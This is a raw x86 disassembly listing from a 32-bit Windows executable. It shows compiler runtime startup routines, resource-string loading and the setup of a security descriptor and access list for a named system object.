  4068c1:	push   DWORD PTR [ebp-0x4]
  4068c4:	push   esi
  4068c5:	call   DWORD PTR ds:0x409050
  4068cb:	push   eax
  4068cc:	call   DWORD PTR ds:0x409054
  4068d2:	cmp    ebx,edi
  4068d4:	je     0x4068e9
  4068d6:	test   edi,edi
  4068d8:	je     0x4068e9
  4068da:	push   edi
  4068db:	push   esi
  4068dc:	call   DWORD PTR ds:0x409050
  4068e2:	push   eax
  4068e3:	call   DWORD PTR ds:0x409054
  4068e9:	pop    edi
  4068ea:	pop    esi
  4068eb:	pop    ebx
  4068ec:	mov    esp,ebp
  4068ee:	pop    ebp
  4068ef:	ret    
  4068f0:	int3   
  4068f1:	int3   
  4068f2:	int3   
  4068f3:	int3   
  4068f4:	int3   
  4068f5:	mov    edi,edi
  4068f7:	push   ebp
  4068f8:	mov    ebp,esp
  4068fa:	mov    eax,0x1418
  4068ff:	call   0x407720
  406904:	mov    eax,ds:0x408004
  406909:	xor    eax,ebp
  40690b:	mov    DWORD PTR [ebp-0x4],eax
  40690e:	push   ebx
  40690f:	push   esi
  406910:	push   edi
  406911:	xor    ebx,ebx
  406913:	push   ebx
  406914:	call   DWORD PTR ds:0x409070
  40691a:	mov    esi,eax
  40691c:	mov    edi,ebx
  40691e:	test   esi,esi
  406920:	je     0x406a13
  406926:	cmp    esi,0xffffffff
  406929:	je     0x406a13
  40692f:	push   0x208
  406934:	lea    eax,[ebp-0x20c]
  40693a:	push   ebx
  40693b:	push   eax
  40693c:	call   0x407768
  406941:	mov    eax,DWORD PTR [ebp+0xc]
  406944:	add    esp,0xc
  406947:	mov    ecx,0x104
  40694c:	sub    eax,ebx
  40694e:	je     0x406972
  406950:	sub    eax,0x1
  406953:	je     0x406966
  406955:	sub    eax,0x1
  406958:	jne    0x406985
  40695a:	push   ecx
  40695b:	lea    eax,[ebp-0x20c]
  406961:	push   eax
  406962:	push   0x16
  406964:	jmp    0x40697c
  406966:	push   ecx
  406967:	lea    eax,[ebp-0x20c]
  40696d:	push   eax
  40696e:	push   0x15
  406970:	jmp    0x40697c
  406972:	push   ecx
  406973:	lea    eax,[ebp-0x20c]
  406979:	push   eax
  40697a:	push   0x14
  40697c:	push   esi
  40697d:	call   DWORD PTR ds:0x40906c
  406983:	mov    edi,eax
  406985:	push   0x208
  40698a:	lea    eax,[ebp-0x414]
  406990:	push   ebx
  406991:	push   eax
  406992:	call   0x407768
  406997:	add    esp,0xc
  40699a:	lea    eax,[ebp-0x414]
  4069a0:	push   0x104
  4069a5:	push   eax
  4069a6:	push   DWORD PTR [ebp+0x8]
  4069a9:	push   esi
  4069aa:	call   DWORD PTR ds:0x40906c
  4069b0:	test   eax,eax
  4069b2:	jle    0x406a13
  4069b4:	push   0x1000
  4069b9:	lea    eax,[ebp-0x1414]
  4069bf:	push   ebx
  4069c0:	push   eax
  4069c1:	call   0x407768
  4069c6:	add    esp,0xc
  4069c9:	lea    eax,[ebp+0x10]
  4069cc:	mov    DWORD PTR [ebp-0x1418],eax
  4069d2:	lea    eax,[ebp-0x1418]
  4069d8:	push   eax
  4069d9:	push   0x800
  4069de:	lea    eax,[ebp-0x1414]
  4069e4:	push   eax
  4069e5:	push   ebx
  4069e6:	push   ebx
  4069e7:	lea    eax,[ebp-0x414]
  4069ed:	push   eax
  4069ee:	push   0x400
  4069f3:	call   DWORD PTR ds:0x409080
  4069f9:	test   edi,edi
  4069fb:	jle    0x406a08
  4069fd:	lea    ecx,[ebp-0x20c]
  406a03:	call   0x406803
  406a08:	lea    ecx,[ebp-0x1414]
  406a0e:	call   0x406803
  406a13:	mov    ecx,DWORD PTR [ebp-0x4]
  406a16:	pop    edi
  406a17:	pop    esi
  406a18:	xor    ecx,ebp
  406a1a:	pop    ebx
  406a1b:	call   0x407090
  406a20:	mov    esp,ebp
  406a22:	pop    ebp
  406a23:	ret    
  406a24:	int3   
  406a25:	int3   
  406a26:	int3   
  406a27:	int3   
  406a28:	int3   
  406a29:	mov    edi,edi
  406a2b:	push   ebp
  406a2c:	mov    ebp,esp
  406a2e:	sub    esp,0x20c
  406a34:	mov    eax,ds:0x408004
  406a39:	xor    eax,ebp
  406a3b:	mov    DWORD PTR [ebp-0x4],eax
  406a3e:	push   edi
  406a3f:	push   0x0
  406a41:	call   DWORD PTR ds:0x409070
  406a47:	mov    edi,eax
  406a49:	test   edi,edi
  406a4b:	je     0x406aa5
  406a4d:	cmp    edi,0xffffffff
  406a50:	je     0x406aa5
  406a52:	push   esi
  406a53:	mov    esi,0x191
  406a58:	push   0x208
  406a5d:	lea    eax,[ebp-0x20c]
  406a63:	push   0x0
  406a65:	push   eax
  406a66:	call   0x407768
  406a6b:	add    esp,0xc
  406a6e:	lea    eax,[ebp-0x20c]
  406a74:	push   0x104
  406a79:	push   eax
  406a7a:	push   esi
  406a7b:	push   edi
  406a7c:	call   DWORD PTR ds:0x40906c
  406a82:	test   eax,eax
  406a84:	jle    0x406a9b
  406a86:	mov    ecx,0x402e20
  406a8b:	call   0x406803
  406a90:	lea    ecx,[ebp-0x20c]
  406a96:	call   0x406803
  406a9b:	inc    esi
  406a9c:	cmp    esi,0x1a0
  406aa2:	jbe    0x406a58
  406aa4:	pop    esi
  406aa5:	mov    ecx,DWORD PTR [ebp-0x4]
  406aa8:	xor    ecx,ebp
  406aaa:	pop    edi
  406aab:	call   0x407090
  406ab0:	mov    esp,ebp
  406ab2:	pop    ebp
  406ab3:	ret    
  406ab4:	int3   
  406ab5:	int3   
  406ab6:	int3   
  406ab7:	int3   
  406ab8:	int3   
  406ab9:	push   0xa8
  406abe:	push   0x407770
  406ac3:	call   0x407414
  406ac8:	xor    ebx,ebx
  406aca:	mov    esi,ebx
  406acc:	mov    edi,ebx
  406ace:	mov    DWORD PTR [ebp-0xa0],edi
  406ad4:	mov    DWORD PTR [ebp-0x84],ebx
  406ada:	mov    WORD PTR [ebp-0x80],0x500
  406ae0:	mov    DWORD PTR [ebp-0x8c],ebx
  406ae6:	mov    WORD PTR [ebp-0x88],0x100
  406aef:	mov    DWORD PTR [ebp-0x98],ebx
  406af5:	mov    DWORD PTR [ebp-0x9c],ebx
  406afb:	mov    DWORD PTR [ebp-0x94],ebx
  406b01:	mov    DWORD PTR [ebp-0x90],ebx
  406b07:	mov    eax,ds:0x4083c8
  406b0c:	test   eax,eax
  406b0e:	jne    0x406cb6
  406b14:	push   0x60
  406b16:	push   ebx
  406b17:	lea    eax,[ebp-0x7c]
  406b1a:	push   eax
  406b1b:	call   0x407768
  406b20:	add    esp,0xc
  406b23:	lea    eax,[ebp-0x98]
  406b29:	push   eax
  406b2a:	push   ebx
  406b2b:	push   ebx
  406b2c:	push   ebx
  406b2d:	push   ebx
  406b2e:	push   ebx
  406b2f:	push   ebx
  406b30:	push   ebx
  406b31:	push   0x12
  406b33:	push   0x1
  406b35:	lea    eax,[ebp-0x84]
  406b3b:	push   eax
  406b3c:	call   DWORD PTR ds:0x40911c
  406b42:	test   eax,eax
  406b44:	jne    0x406b53
  406b46:	call   DWORD PTR ds:0x409010
  406b4c:	mov    esi,eax
  406b4e:	jmp    0x406d38
  406b53:	mov    DWORD PTR [ebp-0x7c],0x1f0001
  406b5a:	push   0x2
  406b5c:	pop    esi
  406b5d:	mov    DWORD PTR [ebp-0x78],esi
  406b60:	mov    DWORD PTR [ebp-0x74],ebx
  406b63:	mov    DWORD PTR [ebp-0x68],ebx
  406b66:	mov    DWORD PTR [ebp-0x64],0x5
  406b6d:	mov    eax,DWORD PTR [ebp-0x98]
  406b73:	mov    DWORD PTR [ebp-0x60],eax
  406b76:	lea    eax,[ebp-0x9c]
  406b7c:	push   eax
  406b7d:	push   ebx
  406b7e:	push   ebx
  406b7f:	push   ebx
  406b80:	push   ebx
  406b81:	push   ebx
  406b82:	push   ebx
  406b83:	push   0x220
  406b88:	push   0x20
  406b8a:	push   esi
  406b8b:	lea    eax,[ebp-0x84]
  406b91:	push   eax
  406b92:	call   DWORD PTR ds:0x40911c
  406b98:	test   eax,eax
  406b9a:	je     0x406b46
  406b9c:	mov    DWORD PTR [ebp-0x5c],0x1f0001
  406ba3:	mov    DWORD PTR [ebp-0x58],esi
  406ba6:	mov    DWORD PTR [ebp-0x54],ebx
  406ba9:	mov    DWORD PTR [ebp-0x48],ebx
  406bac:	mov    DWORD PTR [ebp-0x44],esi
  406baf:	mov    eax,DWORD PTR [ebp-0x9c]
  406bb5:	mov    DWORD PTR [ebp-0x40],eax
  406bb8:	lea    eax,[ebp-0x94]
  406bbe:	push   eax
  406bbf:	push   ebx
  406bc0:	push   ebx
  406bc1:	push   ebx
  406bc2:	push   ebx
  406bc3:	push   ebx
  406bc4:	push   ebx
  406bc5:	push   ebx
  406bc6:	push   ebx
  406bc7:	push   0x1
  406bc9:	lea    eax,[ebp-0x8c]
  406bcf:	push   eax
  406bd0:	call   DWORD PTR ds:0x40911c
  406bd6:	test   eax,eax
  406bd8:	je     0x406b46
  406bde:	mov    DWORD PTR [ebp-0x3c],0x120001
  406be5:	mov    DWORD PTR [ebp-0x38],esi
  406be8:	mov    DWORD PTR [ebp-0x34],ebx
  406beb:	mov    DWORD PTR [ebp-0x28],ebx
  406bee:	mov    DWORD PTR [ebp-0x24],0x5
  406bf5:	mov    eax,DWORD PTR [ebp-0x94]
  406bfb:	mov    DWORD PTR [ebp-0x20],eax
  406bfe:	lea    eax,[ebp-0x90]
  406c04:	push   eax
  406c05:	push   ebx
  406c06:	lea    eax,[ebp-0x7c]
  406c09:	push   eax
  406c0a:	push   0x3
  406c0c:	call   DWORD PTR ds:0x40912c
  406c12:	mov    esi,eax
  406c14:	test   esi,esi
  406c16:	jne    0x406d38
  406c1c:	push   0x14
  406c1e:	push   0x40
  406c20:	call   DWORD PTR ds:0x409060
  406c26:	mov    edi,eax
  406c28:	mov    DWORD PTR [ebp-0xa0],edi
  406c2e:	test   edi,edi
  406c30:	je     0x406b46
  406c36:	push   0x1
  406c38:	push   edi
  406c39:	call   DWORD PTR ds:0x409118
  406c3f:	test   eax,eax
  406c41:	je     0x406b46
  406c47:	push   ebx
  406c48:	push   DWORD PTR [ebp-0x90]
  406c4e:	push   0x1
  406c50:	push   edi
  406c51:	call   DWORD PTR ds:0x409124
  406c57:	test   eax,eax
  406c59:	je     0x406b46
  406c5f:	mov    DWORD PTR [ebp-0xb8],0xc
  406c69:	mov    DWORD PTR [ebp-0xb0],0x1
  406c73:	mov    DWORD PTR [ebp-0xb4],edi
  406c79:	mov    DWORD PTR [ebp-0x4],ebx
  406c7c:	push   0x402e24
  406c81:	push   ebx
  406c82:	lea    eax,[ebp-0xb8]
  406c88:	push   eax
  406c89:	call   DWORD PTR ds:0x4090ec
  406c8f:	mov    ds:0x4083c8,eax
  406c94:	test   eax,eax
  406c96:	jne    0x406cab
  406c98:	call   DWORD PTR ds:0x409010
  406c9e:	mov    esi,eax
  406ca0:	mov    DWORD PTR [ebp-0xa4],esi
  406ca6:	mov    eax,ds:0x4083c8
  406cab:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406cb2:	test   eax,eax
  406cb4:	je     0x406cd8
  406cb6:	mov    DWORD PTR [ebp-0x4],0x1
  406cbd:	push   0x927c0
  406cc2:	push   eax
  406cc3:	call   DWORD PTR ds:0x4090f4
  406cc9:	mov    esi,eax
  406ccb:	mov    DWORD PTR [ebp-0xa4],esi
  406cd1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406cd8:	test   esi,esi
  406cda:	je     0x406d36
  406cdc:	cmp    esi,0x80
  406ce2:	je     0x406d36
  406ce4:	cmp    esi,0xffffffff
  406ce7:	jne    0x406d38
  406ce9:	jmp    0x406b46
  406cee:	mov    eax,DWORD PTR [ebp-0x14]
  406cf1:	mov    eax,DWORD PTR [eax]
  406cf3:	mov    eax,DWORD PTR [eax]
  406cf5:	mov    DWORD PTR [ebp-0xa8],eax
  406cfb:	xor    eax,eax
  406cfd:	inc    eax
  406cfe:	ret    
  406cff:	mov    esi,DWORD PTR [ebp-0xa8]
  406d05:	mov    esp,DWORD PTR [ebp-0x18]
  406d08:	mov    DWORD PTR [ebp-0xa4],esi
  406d0e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406d15:	mov    edi,DWORD PTR [ebp-0xa0]
  406d1b:	jmp    0x406d38
  406d1d:	mov    eax,DWORD PTR [ebp-0x14]
  406d20:	mov    eax,DWORD PTR [eax]
  406d22:	mov    eax,DWORD PTR [eax]
  406d24:	mov    DWORD PTR [ebp-0xac],eax
  406d2a:	xor    eax,eax
  406d2c:	inc    eax
  406d2d:	ret    
  406d2e:	mov    esi,DWORD PTR [ebp-0xac]
  406d34:	jmp    0x406d05
  406d36:	mov    esi,ebx
  406d38:	cmp    DWORD PTR [ebp-0x98],0x0
  406d3f:	je     0x406d4d
  406d41:	push   DWORD PTR [ebp-0x98]
  406d47:	call   DWORD PTR ds:0x409120
  406d4d:	cmp    DWORD PTR [ebp-0x9c],0x0
  406d54:	je     0x406d62
  406d56:	push   DWORD PTR [ebp-0x9c]
  406d5c:	call   DWORD PTR ds:0x409120
  406d62:	cmp    DWORD PTR [ebp-0x94],0x0
  406d69:	je     0x406d77
  406d6b:	push   DWORD PTR [ebp-0x94]
  406d71:	call   DWORD PTR ds:0x409120
  406d77:	cmp    DWORD PTR [ebp-0x90],0x0
  406d7e:	je     0x406d8c
  406d80:	push   DWORD PTR [ebp-0x90]
  406d86:	call   DWORD PTR ds:0x40905c
  406d8c:	test   edi,edi
  406d8e:	je     0x406d97
  406d90:	push   edi
  406d91:	call   DWORD PTR ds:0x40905c
  406d97:	mov    eax,esi
  406d99:	call   0x40745c
  406d9e:	ret    
  406d9f:	int3   
  406da0:	int3   
  406da1:	int3   
  406da2:	int3   
  406da3:	int3   
  406da4:	int3   
  406da5:	int3   
  406da6:	int3   
  406da7:	int3   
  406da8:	int3   
  406da9:	int3   
  406daa:	int3   
  406dab:	int3   
  406dac:	int3   
  406dad:	int3   
  406dae:	int3   
  406daf:	int3   
  406db0:	mov    eax,0x5a4d
  406db5:	cmp    WORD PTR ds:0x400000,ax
  406dbc:	je     0x406dc2
  406dbe:	xor    eax,eax
  406dc0:	jmp    0x406e10
  406dc2:	mov    ecx,DWORD PTR ds:0x40003c
  406dc8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406dd2:	jne    0x406dbe
  406dd4:	movzx  eax,WORD PTR [ecx+0x400018]
  406ddb:	cmp    eax,0x10b
  406de0:	je     0x406dfc
  406de2:	cmp    eax,0x20b
  406de7:	jne    0x406dbe
  406de9:	xor    eax,eax
  406deb:	cmp    DWORD PTR [ecx+0x400084],0xe
  406df2:	jbe    0x406e10
  406df4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  406dfa:	jmp    0x406e0d
  406dfc:	xor    eax,eax
  406dfe:	cmp    DWORD PTR [ecx+0x400074],0xe
  406e05:	jbe    0x406e10
  406e07:	cmp    DWORD PTR [ecx+0x4000e8],eax
  406e0d:	setne  al
  406e10:	push   0x1
  406e12:	mov    ds:0x408068,eax
  406e17:	call   0x40718e
  406e1c:	push   eax
  406e1d:	call   DWORD PTR ds:0x409168
  406e23:	or     DWORD PTR ds:0x4083cc,0xffffffff
  406e2a:	or     DWORD PTR ds:0x4083d0,0xffffffff
  406e31:	pop    ecx
  406e32:	pop    ecx
  406e33:	call   DWORD PTR ds:0x409154
  406e39:	mov    ecx,DWORD PTR ds:0x40807c
  406e3f:	mov    DWORD PTR [eax],ecx
  406e41:	call   DWORD PTR ds:0x409178
  406e47:	mov    ecx,DWORD PTR ds:0x408070
  406e4d:	mov    DWORD PTR [eax],ecx
  406e4f:	call   0x4071e0
  406e54:	cmp    DWORD PTR ds:0x408000,0x0
  406e5b:	jne    0x406e69
  406e5d:	push   0x4071e0
  406e62:	call   DWORD PTR ds:0x409150
  406e68:	pop    ecx
  406e69:	call   0x4073ef
  406e6e:	xor    eax,eax
  406e70:	ret    
  406e71:	int3   
  406e72:	int3   
  406e73:	int3   
  406e74:	int3   
  406e75:	int3   
  406e76:	int3   
  406e77:	int3   
  406e78:	int3   
  406e79:	int3   
  406e7a:	int3   
  406e7b:	int3   
  406e7c:	int3   
  406e7d:	int3   
  406e7e:	int3   
  406e7f:	int3   
  406e80:	mov    eax,ds:0x408078
  406e85:	push   0x40806c
  406e8a:	push   DWORD PTR ds:0x408074
  406e90:	mov    ds:0x40806c,eax
  406e95:	push   0x408060
  406e9a:	push   0x40805c
  406e9f:	push   0x408058
  406ea4:	call   DWORD PTR ds:0x40916c
  406eaa:	add    esp,0x14
  406ead:	mov    ds:0x408064,eax
  406eb2:	ret    
  406eb3:	int3   
  406eb4:	int3   
  406eb5:	int3   
  406eb6:	int3   
  406eb7:	int3   
  406eb8:	push   0x10
  406eba:	push   0x407798
  406ebf:	call   0x407414
  406ec4:	xor    ebx,ebx
  406ec6:	mov    DWORD PTR [ebp-0x4],ebx
  406ec9:	mov    eax,fs:0x18
  406ecf:	mov    esi,DWORD PTR [eax+0x4]
  406ed2:	mov    edi,ebx
  406ed4:	mov    edx,0x4083d4
  406ed9:	mov    ecx,esi
  406edb:	xor    eax,eax
  406edd:	lock cmpxchg DWORD PTR [edx],ecx
  406ee1:	test   eax,eax
  406ee3:	je     0x406efd
  406ee5:	cmp    eax,esi
  406ee7:	jne    0x406ef0
  406ee9:	xor    esi,esi
  406eeb:	inc    esi
  406eec:	mov    edi,esi
  406eee:	jmp    0x406f00
  406ef0:	push   0x3e8
  406ef5:	call   DWORD PTR ds:0x4090f0
  406efb:	jmp    0x406ed4
  406efd:	xor    esi,esi
  406eff:	inc    esi
  406f00:	cmp    DWORD PTR ds:0x4083d8,esi
  406f06:	jne    0x406f12
  406f08:	push   0x1f
  406f0a:	call   0x4071ca
  406f0f:	pop    ecx
  406f10:	jmp    0x406f4c
  406f12:	cmp    DWORD PTR ds:0x4083d8,ebx
  406f18:	jne    0x406f46
  406f1a:	mov    DWORD PTR ds:0x4083d8,esi
  406f20:	push   0x401018
  406f25:	push   0x40100c
  406f2a:	call   0x40702c
  406f2f:	pop    ecx
  406f30:	pop    ecx
  406f31:	test   eax,eax
  406f33:	je     0x406f4c
  406f35:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406f3c:	mov    eax,0xff
  406f41:	jmp    0x407021
  406f46:	mov    DWORD PTR ds:0x408054,esi
  406f4c:	cmp    DWORD PTR ds:0x4083d8,esi
  406f52:	jne    0x406f6f
  406f54:	push   0x401008
  406f59:	push   0x401000
  406f5e:	call   0x407408
  406f63:	pop    ecx
  406f64:	pop    ecx
  406f65:	mov    DWORD PTR ds:0x4083d8,0x2
  406f6f:	test   edi,edi
  406f71:	jne    0x406f7c
  406f73:	xor    eax,eax
  406f75:	mov    ecx,0x4083d4
  406f7a:	xchg   DWORD PTR [ecx],eax
  406f7c:	cmp    DWORD PTR ds:0x4083dc,0x0
  406f83:	je     0x406fa8
  406f85:	push   0x4083dc
  406f8a:	call   0x407240
  406f8f:	pop    ecx
  406f90:	test   eax,eax
  406f92:	je     0x406fa8
  406f94:	push   ebx
  406f95:	push   0x2
  406f97:	push   ebx
  406f98:	mov    esi,DWORD PTR ds:0x4083dc
  406f9e:	mov    ecx,esi
  406fa0:	call   DWORD PTR ds:0x4091a0
  406fa6:	call   esi
  406fa8:	push   DWORD PTR ds:0x408060
  406fae:	push   DWORD PTR ds:0x40805c
  406fb4:	push   DWORD PTR ds:0x408058
  406fba:	call   0x40385e
  406fbf:	add    esp,0xc
  406fc2:	mov    ds:0x408050,eax
  406fc7:	cmp    DWORD PTR ds:0x408068,0x0
  406fce:	jne    0x407006
  406fd0:	push   eax
  406fd1:	call   DWORD PTR ds:0x409164
  406fd7:	mov    ecx,DWORD PTR [ebp-0x14]
  406fda:	mov    eax,DWORD PTR [ecx]
  406fdc:	mov    eax,DWORD PTR [eax]
  406fde:	mov    DWORD PTR [ebp-0x20],eax
  406fe1:	push   ecx
  406fe2:	push   eax
  406fe3:	call   0x407114
  406fe8:	pop    ecx
  406fe9:	pop    ecx
  406fea:	ret    
  406feb:	mov    esp,DWORD PTR [ebp-0x18]
  406fee:	mov    eax,DWORD PTR [ebp-0x20]
  406ff1:	mov    ds:0x408050,eax
  406ff6:	cmp    DWORD PTR ds:0x408068,0x0
  406ffd:	jne    0x407006
  406fff:	push   eax
  407000:	call   DWORD PTR ds:0x40915c
  407006:	cmp    DWORD PTR ds:0x408054,0x0
  40700d:	jne    0x40701a
  40700f:	call   DWORD PTR ds:0x409158
  407015:	mov    eax,ds:0x408050
  40701a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407021:	call   0x40745c
  407026:	ret    
  407027:	int3   
  407028:	int3   
  407029:	int3   
  40702a:	int3   
  40702b:	int3   
  40702c:	mov    edi,edi
  40702e:	push   ebp
  40702f:	mov    ebp,esp
  407031:	push   ecx
  407032:	mov    eax,ds:0x408004
  407037:	xor    eax,ebp
  407039:	mov    DWORD PTR [ebp-0x4],eax
  40703c:	push   esi
  40703d:	mov    esi,DWORD PTR [ebp+0x8]
  407040:	xor    eax,eax
  407042:	cmp    esi,DWORD PTR [ebp+0xc]
  407045:	jae    0x407065
  407047:	push   edi
  407048:	test   eax,eax
  40704a:	jne    0x407064
  40704c:	mov    edi,DWORD PTR [esi]
  40704e:	test   edi,edi
  407050:	je     0x40705c
  407052:	mov    ecx,edi
  407054:	call   DWORD PTR ds:0x4091a0
  40705a:	call   edi
  40705c:	add    esi,0x4
  40705f:	cmp    esi,DWORD PTR [ebp+0xc]
  407062:	jb     0x407048
  407064:	pop    edi
  407065:	mov    ecx,DWORD PTR [ebp-0x4]
  407068:	xor    ecx,ebp
  40706a:	pop    esi
  40706b:	call   0x407090
  407070:	mov    esp,ebp
  407072:	pop    ebp
  407073:	ret    
  407074:	int3   
  407075:	int3   
  407076:	int3   
  407077:	int3   
  407078:	int3   
  407079:	int3   
  40707a:	int3   
  40707b:	int3   
  40707c:	int3   
  40707d:	int3   
  40707e:	int3   
  40707f:	int3   
  407080:	call   0x407348
  407085:	jmp    0x406eb8
  40708a:	int3   
  40708b:	int3   
  40708c:	int3   
  40708d:	int3   
  40708e:	int3   
  40708f:	int3   
  407090:	cmp    ecx,DWORD PTR ds:0x408004
  407096:	jne    0x40709b
  407098:	ret    0x0
  40709b:	jmp    0x4074d5
  4070a0:	int3   
  4070a1:	int3   
  4070a2:	int3   
  4070a3:	int3   
  4070a4:	int3   
  4070a5:	int3   
  4070a6:	int3   
  4070a7:	int3   
  4070a8:	int3   
  4070a9:	int3   
  4070aa:	int3   
  4070ab:	int3   
  4070ac:	int3   
  4070ad:	int3   
  4070ae:	int3   
  4070af:	int3   
  4070b0:	mov    edi,edi
  4070b2:	push   ebp
  4070b3:	mov    ebp,esp
  4070b5:	mov    eax,DWORD PTR [ebp+0x8]
  4070b8:	mov    eax,DWORD PTR [eax]
  4070ba:	cmp    DWORD PTR [eax],0xe06d7363
  4070c0:	jne    0x4070ed
  4070c2:	cmp    DWORD PTR [eax+0x10],0x3
  4070c6:	jne    0x4070ed
  4070c8:	mov    eax,DWORD PTR [eax+0x14]
  4070cb:	cmp    eax,0x19930520
  4070d0:	je     0x4070e7
  4070d2:	cmp    eax,0x19930521
  4070d7:	je     0x4070e7
  4070d9:	cmp    eax,0x19930522
  4070de:	je     0x4070e7
  4070e0:	cmp    eax,0x1994000
  4070e5:	jne    0x4070ed
  4070e7:	call   DWORD PTR ds:0x409144
  4070ed:	xor    eax,eax
  4070ef:	pop    ebp
  4070f0:	ret    0x4
  4070f3:	int3   
  4070f4:	int3   
  4070f5:	int3   
  4070f6:	int3   
  4070f7:	int3   
  4070f8:	int3   
  4070f9:	int3   
  4070fa:	int3   
  4070fb:	int3   
  4070fc:	int3   
  4070fd:	int3   
  4070fe:	int3   
  4070ff:	int3   
  407100:	push   0x4070b0
  407105:	call   DWORD PTR ds:0x409018
  40710b:	xor    eax,eax
  40710d:	ret    
  40710e:	int3   
  40710f:	int3   
  407110:	int3   
  407111:	int3   
  407112:	int3   
  407113:	int3   
  407114:	jmp    DWORD PTR ds:0x409180
  40711a:	int3   
  40711b:	int3   
  40711c:	int3   
  40711d:	int3   
  40711e:	int3   
  40711f:	push   0xc
  407121:	push   0x4077b8
  407126:	call   0x4076ac
  40712b:	xor    ecx,ecx
  40712d:	mov    eax,DWORD PTR [ebp+0x8]
  407130:	test   eax,eax
  407132:	je     0x40717f
  407134:	cmp    eax,0xffffffff
  407137:	je     0x40717f
  407139:	mov    DWORD PTR [ebp-0x4],ecx
  40713c:	mov    edx,0x5a4d
  407141:	cmp    WORD PTR [eax],dx
  407144:	jne    0x407178
  407146:	mov    edx,DWORD PTR [eax+0x3c]
  407149:	test   edx,edx
  40714b:	js     0x407178
  40714d:	cmp    edx,0x10000000
  407153:	jae    0x407178
  407155:	add    eax,edx
  407157:	mov    DWORD PTR [ebp-0x1c],eax
  40715a:	mov    ecx,DWORD PTR [eax]
  40715c:	sub    ecx,0x4550
  407162:	neg    ecx
  407164:	sbb    ecx,ecx
  407166:	not    ecx
  407168:	and    ecx,eax
  40716a:	jmp    0x407175
  40716c:	xor    eax,eax
  40716e:	inc    eax
  40716f:	ret    
  407170:	mov    esp,DWORD PTR [ebp-0x18]
  407173:	xor    ecx,ecx
  407175:	mov    DWORD PTR [ebp-0x1c],ecx
  407178:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40717f:	mov    eax,ecx
  407181:	call   0x4076f1
  407186:	ret    0x4
  407189:	int3   
  40718a:	int3   
  40718b:	int3   
  40718c:	int3   
  40718d:	int3   
  40718e:	mov    edi,edi
  407190:	push   ebp
  407191:	mov    ebp,esp
  407193:	push   0x0
  407195:	call   DWORD PTR ds:0x409068
  40719b:	test   eax,eax
  40719d:	je     0x4071bf
  40719f:	push   eax
  4071a0:	call   0x40711f
  4071a5:	test   eax,eax
  4071a7:	je     0x4071bf
  4071a9:	movzx  ecx,WORD PTR [eax+0x5c]
  4071ad:	push   0x2
  4071af:	pop    eax
  4071b0:	cmp    cx,ax
  4071b3:	je     0x4071c2
  4071b5:	cmp    ecx,0x3
  4071b8:	jne    0x4071bf
  4071ba:	xor    eax,eax
  4071bc:	inc    eax
  4071bd:	pop    ebp
  4071be:	ret    
  4071bf:	mov    eax,DWORD PTR [ebp+0x8]
  4071c2:	pop    ebp
  4071c3:	ret    
  4071c4:	int3   
  4071c5:	int3   
  4071c6:	int3   
  4071c7:	int3   
  4071c8:	int3   
  4071c9:	int3   
  4071ca:	jmp    DWORD PTR ds:0x409174
  4071d0:	int3   
  4071d1:	int3   
  4071d2:	int3   
  4071d3:	int3   
  4071d4:	int3   
  4071d5:	int3   
  4071d6:	int3   
  4071d7:	int3   
  4071d8:	int3   
  4071d9:	int3   
  4071da:	int3   
  4071db:	int3   
  4071dc:	int3   
  4071dd:	int3   
  4071de:	int3   
  4071df:	int3   
  4071e0:	xor    eax,eax
  4071e2:	ret    
  4071e3:	int3   
  4071e4:	int3   
  4071e5:	int3   
  4071e6:	int3   
  4071e7:	int3   
  4071e8:	int3   
  4071e9:	int3   
  4071ea:	int3   
  4071eb:	int3   
  4071ec:	int3   
  4071ed:	int3   
  4071ee:	int3   
  4071ef:	int3   
  4071f0:	mov    edi,edi
  4071f2:	push   ebp
  4071f3:	mov    ebp,esp
  4071f5:	mov    eax,DWORD PTR [ebp+0x8]
  4071f8:	xor    edx,edx
  4071fa:	push   ebx
  4071fb:	push   esi
  4071fc:	push   edi
  4071fd:	mov    ecx,DWORD PTR [eax+0x3c]
  407200:	add    ecx,eax
  407202:	movzx  eax,WORD PTR [ecx+0x14]
  407206:	movzx  ebx,WORD PTR [ecx+0x6]
  40720a:	add    eax,0x18
  40720d:	add    eax,ecx
  40720f:	test   ebx,ebx
  407211:	je     0x40722e
  407213:	mov    edi,DWORD PTR [ebp+0xc]
  407216:	mov    esi,DWORD PTR [eax+0xc]
  407219:	cmp    edi,esi
  40721b:	jb     0x407226
  40721d:	mov    ecx,DWORD PTR [eax+0x8]
  407220:	add    ecx,esi
  407222:	cmp    edi,ecx
  407224:	jb     0x407230
  407226:	inc    edx
  407227:	add    eax,0x28
  40722a:	cmp    edx,ebx
  40722c:	jb     0x407216
  40722e:	xor    eax,eax
  407230:	pop    edi
  407231:	pop    esi
  407232:	pop    ebx
  407233:	pop    ebp
  407234:	ret    
  407235:	int3   
  407236:	int3   
  407237:	int3   
  407238:	int3   
  407239:	int3   
  40723a:	int3   
  40723b:	int3   
  40723c:	int3   
  40723d:	int3   
  40723e:	int3   
  40723f:	int3   
  407240:	mov    edi,edi
  407242:	push   ebp
  407243:	mov    ebp,esp
  407245:	push   0xfffffffe
  407247:	push   0x4077d8
  40724c:	push   0x407470
  407251:	mov    eax,fs:0x0
  407257:	push   eax
  407258:	sub    esp,0x8
  40725b:	push   ebx
  40725c:	push   esi
  40725d:	push   edi
  40725e:	mov    eax,ds:0x408004
  407263:	xor    DWORD PTR [ebp-0x8],eax
  407266:	xor    eax,ebp
  407268:	push   eax
  407269:	lea    eax,[ebp-0x10]
  40726c:	mov    fs:0x0,eax
  407272:	mov    DWORD PTR [ebp-0x18],esp
  407275:	mov    DWORD PTR [ebp-0x4],0x0
  40727c:	push   0x400000
  407281:	call   0x407310
  407286:	add    esp,0x4
  407289:	test   eax,eax
  40728b:	je     0x4072e1
  40728d:	mov    eax,DWORD PTR [ebp+0x8]
  407290:	sub    eax,0x400000
  407295:	push   eax
  407296:	push   0x400000
  40729b:	call   0x4071f0
  4072a0:	add    esp,0x8
  4072a3:	test   eax,eax
  4072a5:	je     0x4072e1
  4072a7:	mov    eax,DWORD PTR [eax+0x24]
  4072aa:	shr    eax,0x1f
  4072ad:	not    eax
  4072af:	and    eax,0x1
